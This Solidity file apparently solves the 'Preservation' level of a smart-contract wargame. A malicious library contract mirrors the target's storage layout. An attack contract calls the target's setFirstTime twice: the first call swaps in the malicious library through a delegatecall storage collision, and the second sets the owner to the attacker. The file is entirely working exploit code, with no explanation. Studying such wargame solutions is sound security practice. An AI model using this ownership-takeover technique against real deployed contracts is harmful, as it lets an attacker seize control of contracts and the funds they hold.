// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttackLib {
    // Same contract storage.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

contract PreservationAttack {
    function attack(address _perservationAddr, address _lib) external {
        IPreservation(_perservationAddr).setFirstTime(uint(address(_lib)));
        IPreservation(_perservationAddr).setFirstTime(0);
    }
}
